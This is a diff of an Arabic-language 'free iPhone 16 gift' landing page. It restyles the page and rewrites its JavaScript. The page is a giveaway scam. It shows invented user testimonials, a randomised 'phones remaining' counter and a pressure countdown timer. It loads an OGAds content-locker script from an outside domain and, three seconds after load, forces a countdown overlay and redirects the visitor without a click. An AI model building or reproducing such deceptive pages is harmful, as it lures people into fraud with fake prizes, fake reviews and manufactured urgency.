@@ -8,239 +8,515 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap');
         
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: 'Tajawal', sans-serif;
             text-align: center;
-        }
-        
-        header {
-            color: #fff;
+            background: linear-gradient(180deg, #0c1247 0%, #28337d 20%, #505dad 40%, #7d8ed1 60%, #aebce6 80%, #efecff 95%, #ffffff 100%);
             min-height: 100vh;
-            background: linear-gradient(180deg, rgb(12 18 71), rgb(40 51 125) 28%, rgb(80 93 173) 46%, rgb(125 142 209) 60%, rgb(174 188 230) 75%, rgb(239 236 255) 90%, rgb(255 255 255));
-            padding: 20px;
+            overflow-x: hidden;
         }
 
-        .content {
+        .main-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px 15px;
             position: relative;
+        }
+
+        /* رأس الصفحة */
+        .header {
+            text-align: center;
+            padding: 30px 0 20px;
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            font-weight: 900;
+            color: #fff;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            letter-spacing: 1px;
+        }
+        
+        .give {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #ffd700;
+            text-shadow: 3px 3px 6px rgba(0,0,0,0.4);
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        /* قسم الصورة */
+        .image-section {
+            position: relative;
+            margin: 20px auto;
+            max-width: 400px;
         }
         
         .stand {
-            width: 90%;
+            width: 100%;
+            opacity: 0.9;
         }
         
         .ip {
             position: absolute;
-            top: 25px;
-            width: 83%;
+            top: 20px;
+            width: 80%;
             left: 50%;
             transform: translateX(-50%);
+            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));
         }
 
-        .timer {
+        /* قسم العرض */
+        .offer-section {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 30px 0;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
+        .offer-text {
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 15px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+
+        /* العداد التنازلي الرئيسي */
+        .main-timer {
             display: flex;
             justify-content: center;
             align-items: center;
+            margin: 20px 0;
         }
         
-        .timer > div.separator {
-            margin: 0 5px;
+        .main-timer > div.separator {
+            margin: 0 8px;
             font-weight: bold;
+            color: #fff;
+            font-size: 2rem;
         }
         
-        .timer > div:not(.separator) {
+        .main-timer > div:not(.separator) {
             display: flex;
         }
         
-        .timer > div:not(.separator) > div {
-            background-color: rgb(100, 84, 186);
-            width: 37px;
-            margin: 2px;
-            height: 45px;
+        .main-timer > div:not(.separator) > div {
+            background: linear-gradient(135deg, #6454ba, #4a3d8c);
+            width: 45px;
+            margin: 3px;
+            height: 55px;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-size: 1.5rem;
-        }
-        
-        .offer {
-            margin-bottom: 10px;
-            font-size: 1.2rem;
+            font-size: 1.8rem;
+            color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
             font-weight: bold;
         }
 
+        /* عد تنازلي 3 ثواني */
+        .countdown-3sec {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+            display: none;
+        }
+
+        .countdown-number {
+            font-size: 8rem;
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8), 0 0 40px rgba(100, 84, 186, 0.6);
+            animation: countdownPulse 1s ease-in-out;
+            background: rgba(0,0,0,0.7);
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+        }
+
+        @keyframes countdownPulse {
+            0% { transform: scale(0.5); opacity: 0; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 9998;
+            display: none;
+            backdrop-filter: blur(5px);
+        }
+
+        /* زر الطلب */
         .action {
             display: flex;
             justify-content: center;
-            margin-top: 35px;
+            margin: 30px 0;
         }
         
-        .action > div {
-            background-color: #0071e3;
-            font-size: 1.3rem;
-            padding: 9px 40px;
-            border-radius: 35px;
+        .order-btn {
+            background: linear-gradient(135deg, #0071e3, #005bb5);
+            color: #fff;
+            font-size: 1.5rem;
+            padding: 15px 50px;
+            border-radius: 50px;
             font-weight: bold;
-            border-bottom: 7px solid #13508e;
+            border: none;
             cursor: pointer;
             transition: all 0.3s ease;
+            box-shadow: 0 6px 20px rgba(0, 113, 227, 0.4);
+            position: relative;
+            overflow: hidden;
         }
         
-        .action > div:hover {
-            background-color: #005bb5;
-            transform: translateY(-2px);
+        .order-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(0, 113, 227, 0.6);
         }
         
-        .left {
-            margin-top: 15px;
-            color: #444;
-            font-weight: bold;
+        .order-btn:active {
+            transform: translateY(1px);
         }
 
-        .comments {
-            padding: 20px;
-            background-color: #f8f9fa;
+        .order-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
         }
-        
-        .comments .cm {
-            display: flex;
+
+        .order-btn:hover::before {
+            left: 100%;
+        }
+
+        /* عدد الهواتف المتبقية */
+        .remaining-phones {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            padding: 15px 30px;
+            border-radius: 30px;
+            display: inline-block;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .remaining-phones b {
+            color: #ff4757;
+            font-size: 1.2rem;
+        }
+
+        /* قسم التعليقات */
+        .comments-section {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 40px 0 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
+        .comments-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #333;
             margin-bottom: 20px;
-            text-align: right;
+            text-align: center;
         }
-        
-        .comments .cm .img img {
+
+        .comment {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 15px;
+        }
+
+        .comment-avatar {
             width: 50px;
             height: 50px;
             border-radius: 50%;
+            margin-left: 15px;
+            flex-shrink: 0;
         }
-        
-        .comments .cm .content {
-            padding-right: 10px;
+
+        .comment-content {
             flex: 1;
-        }
-        
-        .comments .txt {
-            background-color: #eee;
-            padding: 10px 15px;
-            border-radius: 15px;
-            max-width: 90%;
             text-align: right;
         }
-        
-        .comments .txt p {
-            all: unset;
-        }
-        
-        .comments .txt .name {
+
+        .comment-name {
             font-weight: bold;
             color: #1877f2;
+            margin-bottom: 5px;
         }
-        
-        .comments .content img {
+
+        .comment-text {
+            color: #333;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        .comment-image {
             width: 80%;
-            border-radius: 15px;
-            margin-top: 5px;
+            max-width: 250px;
+            border-radius: 10px;
+            margin-top: 8px;
         }
-        
-        h1 {
-            font-size: 3rem;
-            font-weight: 900;
-            margin-bottom: 10px;
-        }
-        
-        .give {
-            font-size: 1.8rem;
-            font-weight: 800;
-            color: #ffd700;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-        
+
         /* تحسينات للموبايل */
         @media (max-width: 768px) {
+            .main-container {
+                padding: 15px 10px;
+            }
+
             h1 {
-                font-size: 2.5rem;
+                font-size: 2.8rem;
             }
             
             .give {
+                font-size: 1.6rem;
+            }
+
+            .image-section {
+                max-width: 350px;
+            }
+
+            .main-timer > div:not(.separator) > div {
+                width: 38px;
+                height: 48px;
                 font-size: 1.5rem;
             }
-            
-            .timer > div:not(.separator) > div {
-                width: 32px;
-                height: 40px;
-                font-size: 1.2rem;
+
+            .order-btn {
+                font-size: 1.3rem;
+                padding: 13px 40px;
+            }
+
+            .countdown-number {
+                font-size: 6rem;
+                width: 150px;
+                height: 150px;
+            }
+
+            .offer-section {
+                padding: 20px 15px;
+            }
+
+            .comments-section {
+                padding: 20px 15px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 2.3rem;
             }
             
-            .action > div {
+            .give {
+                font-size: 1.4rem;
+            }
+
+            .main-timer > div:not(.separator) > div {
+                width: 32px;
+                height: 42px;
+                font-size: 1.3rem;
+            }
+
+            .order-btn {
                 font-size: 1.1rem;
-                padding: 8px 30px;
+                padding: 12px 35px;
             }
         }
     </style>
+<base target="_blank">
 </head>
 <body>
     
-    <header>
-        <h1>iPhone 16</h1>
-        <div class="give">هدية مجانية</div>
-        <br>
-        <div class="content">
-            <br>
-            <br>
-            <br>
-            <img class="ip" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmFCo4wavYFkFx9ssC_Yr9FIi32atyhxyIystUT_Etzt-pCt0tuSACpMedE-ycV4_8Zwpc7xItCZx99PFMgrt9nr3H0XDWoXBJeGApKORlToPDRrNHXYM4jMo5_l0vvP2r3Ict69a1TFcuu_lQKFvcelLaHam3WFENYqqAbJjwTmgAB5bIPRGX7hsF2zY/s16000/Untitled-1xxx-01.png" alt="iPhone 16">
+    <div class="main-container">
+        <!-- رأس الصفحة -->
+        <div class="header">
+            <h1>iPhone 16</h1>
+            <div class="give">هدية مجانية</div>
+        </div>
+
+        <!-- قسم الصورة -->
+        <div class="image-section">
             <img class="stand" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEga_ke61RqVTesA8Sl4DfVQPbfMDM1_vRsftO2a_Wm0gczM4WCxsNXy8kXMCRbeNVopTkcqFP5Q68unNkOXBUqtEcNftcJkSByqLntNUQdxQ5wR7C7PYeahQKl1UdmXjiYVoXhKbYljC0y48k-LDFQffmwEd-9nM5AxTLm7QyDiz67R7npA2B0Q7s08uIQ/w640-h640/%E2%80%94Pngtree%E2%80%94white%20pedestal%20with%20golden%20circle_8954970.png" alt="stand">
+            <img class="ip" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmFCo4wavYFkFx9ssC_Yr9FIi32atyhxyIystUT_Etzt-pCt0tuSACpMedE-ycV4_8Zwpc7xItCZx99PFMgrt9nr3H0XDWoXBJeGApKORlToPDRrNHXYM4jMo5_l0vvP2r3Ict69a1TFcuu_lQKFvcelLaHam3WFENYqqAbJjwTmgAB5bIPRGX7hsF2zY/s16000/Untitled-1xxx-01.png" alt="iPhone 16">
         </div>
 
-        <div class="offer">هذا العرض سينتهي بعد:</div>
-        <div class="timer">
-            <div class="hours">
-                <div id="hoursTens"></div>
-                <div id="hoursOnes"></div>
+        <!-- قسم العرض -->
+        <div class="offer-section">
+            <div class="offer-text">هذا العرض سينتهي بعد:</div>
+            
+            <!-- العداد التنازلي الرئيسي -->
+            <div class="main-timer">
+                <div class="hours">
+                    <div id="hoursTens">0</div>
+                    <div id="hoursOnes">1</div>
+                </div>
+                <div class="separator">:</div>
+                <div class="minutes">
+                    <div id="minutesTens">3</div>
+                    <div id="minutesOnes">4</div>
+                </div>
+                <div class="separator">:</div>
+                <div class="seconds">
+                    <div id="secondsTens">5</div>
+                    <div id="secondsOnes">2</div>
+                </div>
             </div>
-            <div class="separator">:</div>
-            <div class="minutes">
-                <div id="minutesTens"></div>
-                <div id="minutesOnes"></div>
+
+            <!-- عدد الهواتف المتبقية -->
+            <div class="remaining-phones">
+                <b>63</b> iPhone 16 متبقي
             </div>
-            <div class="separator">:</div>
-            <div class="seconds">
-                <div id="secondsTens"></div>
-                <div id="secondsOnes"></div>
+
+            <!-- زر الطلب -->
+            <div class="action">
+                <button class="order-btn" onclick="startCountdownAndRedirect()">
+                    احصل على هاتفك الآن
+                </button>
             </div>
         </div>
 
-        <div class="action">
-            <div class="order">احصل على هاتفك الآن</div>
+        <!-- قسم التعليقات -->
+        <div class="comments-section">
+            <div class="comments-title">تعليقات المستخدمين</div>
+            
+            <div class="comment">
+                <img class="comment-avatar" src="https://i.pravatar.cc/150?img=1" alt="avatar">
+                <div class="comment-content">
+                    <div class="comment-name">أحمد محمد</div>
+                    <div class="comment-text">شكراً! استلمت iPhone 16 الخاص بي اليوم. الهاتف رائع جداً!</div>
+                    <img class="comment-image" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnMQT2FytMJ1WQDo7p4sIcuF4oqeI7jQbgRWrC_ogoGjqoMUvoQighBAO2llQTeC1S6rkJQmI7b7kCBJmzu2sDPjhtBhUF3mHk33tENYOnLYpxrUJJuAOL3Nd2EZ-iujo1-Et8CNW7ci8w-2nFVgtNvP3G7VZgQHY3klu1XSZzvTtiwX5-O-RmBit7Pwn1/s1600/Untitled-xxx1-01.png" alt="iPhone">
+                </div>
+            </div>
+
+            <div class="comment">
+                <img class="comment-avatar" src="https://i.pravatar.cc/150?img=2" alt="avatar">
+                <div class="comment-content">
+                    <div class="comment-name">سارة العلي</div>
+                    <div class="comment-text">لم أصدق أنه حقيقي حتى وصل الهاتف. شكراً للعرض الرائع!</div>
+                </div>
+            </div>
+
+            <div class="comment">
+                <img class="comment-avatar" src="https://i.pravatar.cc/150?img=3" alt="avatar">
+                <div class="comment-content">
+                    <div class="comment-name">خالد الفهد</div>
+                    <div class="comment-text">الكاميرا ممتازة والأداء سريع جداً. أنصح الجميع بالمشاركة</div>
+                    <img class="comment-image" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgT1f7FsEY4085IvB9Pi-D54UnKgXO0vV9RA3K4pi8aqxWUaXAy5HQwkUO-SqvYoFP2VKQ0LcMC4a7F2VT4-74y-0x91Jp5LYycf_AAoFc8pCgyDR5vVVs136uMsAH3OMTc90xniS1fc9EsLEY4o9lHszvDbNAzyIPHERe6sYXNILYA3fyLXTBq_L3QXUYv/s1600/Untitled-xx1-01.png" alt="iPhone">
+                </div>
+            </div>
+
+            <div class="comment">
+                <img class="comment-avatar" src="https://i.pravatar.cc/150?img=4" alt="avatar">
+                <div class="comment-content">
+                    <div class="comment-name">فاطمة الزهراني</div>
+                    <div class="comment-text">سرعة التوصيل كانت مذهلة والهاتف فرصة لا تعوض</div>
+                </div>
+            </div>
         </div>
-        <div class="left"><b>63</b> iPhone 16 متبقي</div>
-        
-    </header>
+    </div>
+
+    <!-- Overlay للعد التنازلي -->
+    <div class="overlay" id="overlay"></div>
     
+    <!-- عد تنازلي 3 ثواني -->
+    <div class="countdown-3sec" id="countdown3sec">
+        <div class="countdown-number" id="countdownNumber">3</div>
+    </div>
+
     <!-- كود لوكر OGAds -->
     <script type="text/javascript" id="ogjs" src="https://lockedapp.org/cl/js/m55v54"></script>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script>
         // رابط الإحالة - قم بتغييره إلى الرابط الذي تريد
         var redirectUrl = "https://example.com"; 
-        
-        // فتح العرض تلقائياً بعد 1 ثانية من تحميل الصفحة
+
+        // فتح العرض تلقائياً بعد 3 ثواني من تحميل الصفحة
         window.addEventListener('load', function() {
             setTimeout(function() {
-                // محاكاة النقر على زر المطالبة
-                $('.action .order').trigger('click');
-            }, 1000);
+                startCountdownAndRedirect();
+            }, 3000);
         });
 
-        // عند النقر على زر المطالبة
-        $(".action .order").on("click", function(){
-            // إظهار رسالة تحميل
-            $(this).text('جاري التحميل...').css('background-color', '#28a745');
+        // دالة العد التنازلي 3 ثواني والتحويل
+        function startCountdownAndRedirect() {
+            // إظهار الـ overlay والعداد
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('countdown3sec').style.display = 'block';
             
-            // الانتقال إلى الرابط بعد ثانية
-            setTimeout(function(){
-                window.location.href = redirectUrl; 
+            let count = 3;
+            const countdownElement = document.getElementById('countdownNumber');
+            
+            // تحديث العداد كل ثانية
+            const interval = setInterval(function() {
+                count--;
+                
+                if (count > 0) {
+                    countdownElement.textContent = count;
+                    // إعادة تشغيل الأنيميشن
+                    countdownElement.style.animation = 'none';
+                    setTimeout(function() {
+                        countdownElement.style.animation = 'countdownPulse 1s ease-in-out';
+                    }, 10);
+                } else {
+                    clearInterval(interval);
+                    
+                    // إخفاء العداد وإظهار رسالة التحميل
+                    countdownElement.textContent = 'جاري التحميل...';
+                    countdownElement.style.fontSize = '2rem';
+                    
+                    // تغيير زر الطلب
+                    const orderBtn = document.querySelector('.order-btn');
+                    orderBtn.textContent = 'جاري التحميل...';
+                    orderBtn.style.background = 'linear-gradient(135deg, #28a745, #1e7e34)';
+                    
+                    // الانتقال إلى الرابط بعد ثانية
+                    setTimeout(function(){
+                        window.location.href = redirectUrl; 
+                    }, 1000);
+                }
             }, 1000);
-        });
+        }
 
         // صور iPhone المتغيرة
         var images = [
@@ -251,11 +527,13 @@
             "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhzxD0ZNkdMITFdXOK0UUfqHMFMGhTHnzlPVH2PVgabkHEhesVRE9Lz24IshlgEAv8pGBs9eDOXhmI5FswntTj9-4Yfk8YQnjp7tBrB7f1mMTHVNRtW2OXUxScA4DyNxL_gUVIyr67qb4l7tV154ES-2VdTqzn455HPZUCGX6ttS8kyZmSzieQ5T5FiLqQC/s1600/Untitled-1xxx-01.png"
         ];
 
-        // تغيير الصورة كل 2 ثانية
+        // تغيير الصورة كل 3 ثواني
         setInterval(function(){
             const randomItem = images[Math.floor(Math.random() * images.length)];
-            $(".ip").attr("src", randomItem);
-        }, 2000);
+            $(".ip").fadeOut(300, function() {
+                $(this).attr("src", randomItem).fadeIn(300);
+            });
+        }, 3000);
 
         // Function to pad numbers with leading zeros
         function padZero(number) {
@@ -289,7 +567,8 @@
                 if (durationInSeconds <= 0) {
                     clearInterval(timerInterval);
                     // عند انتهاء الوقت، أظهر رسالة
-                    $('.offer').text('انتهى الوقت! لا تفوت الفرصة القادمة');
+                    $('.offer-text').text('انتهى الوقت! لا تفوت الفرصة القادمة').css('color', '#ff4757');
+                    $('.order-btn').text('عرض جديد قريباً').prop('disabled', true).css('opacity', '0.6');
                 }
 
                 // Decrease the duration
@@ -304,9 +583,53 @@
         // تحديث عدد الهواتف المتبقية بشكل عشوائي
         setInterval(function() {
             var remaining = Math.floor(Math.random() * 5) + 60; // بين 60 و 64
-            $('.left b').text(remaining);
-        }, 5000);
-    </script>   
+            $('.remaining-phones b').text(remaining);
+        }, 7000);
+
+        // تأثيرات بصرية إضافية
+        $(document).ready(function() {
+            // إضافة تأثير تموج عند النقر على الزر
+            $('.order-btn').on('click', function(e) {
+                var ripple = $('<span class="ripple"></span>');
+                var posX = $(this).offset().left;
+                var posY = $(this).offset().top;
+                var buttonWidth = $(this).width();
+                var buttonHeight = $(this).height();
+                
+                ripple.css({
+                    width: buttonHeight,
+                    height: buttonHeight,
+                    top: e.pageY - posY - buttonHeight/2,
+                    left: e.pageX - posX - buttonHeight/2,
+                    background: 'rgba(255,255,255,0.5)'
+                });
+                
+                $(this).append(ripple);
+                
+                setTimeout(function() {
+                    ripple.remove();
+                }, 1000);
+            });
+        });
+    </script>
+
+    <style>
+        /* تأثير التموج */
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            transform: scale(0);
+            animation: ripple-animation 0.6s linear;
+            pointer-events: none;
+        }
+
+        @keyframes ripple-animation {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+    </style>
 
 </body>
 </html>
